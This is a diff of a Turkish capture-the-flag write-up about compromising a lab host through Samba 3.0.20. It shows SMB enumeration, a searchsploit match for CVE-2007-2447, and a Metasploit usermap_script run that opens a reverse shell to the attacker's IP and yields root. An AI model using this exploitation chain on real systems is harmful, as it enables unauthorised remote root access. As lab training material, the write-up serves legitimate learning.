@@ -37,7 +37,7 @@ opt             Disk
 IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 ```
 
-`tmp` paylaşımına anonim olarak bağlanabildim ve içindeki dosyalara baktım. Bir log dosyasını (`vgauthsvclog.txt.0`) indirip inceledim, ama içeriği VMware Tools'a ait rutin bir servis logundan ibaretti — kritik bir bilgi çıkmadı.
+`tmp` paylaşımına anonim olarak bağlanabildim ve içindeki dosyalara baktım. Bir log dosyasını (`vgauthsvclog.txt.0`) indirip inceledim, ama içeriği VMware Tools'a ait rutin bir servis logundan ibaretti.
 
 Yine de SMB banner'ından çok değerli bir bilgi almıştım: **`Samba 3.0.20-Debian`**. Nmap çıktısı da bunu doğruluyordu. Bu spesifik versiyon numarası, bir sonraki adımım için bana net bir yön verdi.
 
@@ -54,7 +54,6 @@ searchsploit "Samba 3.0.20"
 ```
 
 <img width="860" height="197" alt="2" src="https://github.com/user-attachments/assets/7f222e7e-20a2-44e4-8ce7-ec0b3283c6c1" />
-
 
 İkinci satır tam olarak elimdeki versiyon aralığına (`3.0.20 < 3.0.25rc3`) uyuyordu: **"username map script" Command Execution**. Bu, CVE-2007-2447 olarak bilinen ve Samba'nın `smb.conf` dosyasındaki `username map script` özelliğinin kötüye kullanılmasına dayanan, oldukça ünlü bir uzaktan kod çalıştırma zafiyeti.
 
@@ -125,7 +124,7 @@ msf exploit(multi/samba/usermap_script) > run
 [*] Command shell session 1 opened (10.10.14.187:4444 -> 10.129.50.11:46555) at 2026-08-29 18:01:21 -0400
 ```
 
-Shell direkt açıldı. Kim olduğuma baktığımda gördüğüm şey beni gerçekten şaşırttı:
+Shell direkt açıldı.
 
 ```
 whoami
@@ -134,10 +133,7 @@ root
 
 <img width="853" height="609" alt="msfconsole" src="https://github.com/user-attachments/assets/ad49680a-7245-41d8-9dbf-a142e3fd52b7" />
 
-
-Herhangi bir privilege escalation adımına gerek kalmadan, exploit tek başına doğrudan **root** yetkisi verdi. Bunun sebebi, o dönemde Samba servisinin genellikle root yetkisiyle çalıştırılması — yani zafiyeti tetikleyen komut da doğal olarak root bağlamında çalışıyor.
-
----
+Herhangi bir privilege escalation adımına gerek kalmadan, exploit tek başına doğrudan **root** yetkisi verdi. Bunun sebebi, o dönemde Samba servisinin genellikle root yetkisiyle çalıştırılması
 
 ## Flag'ler
 
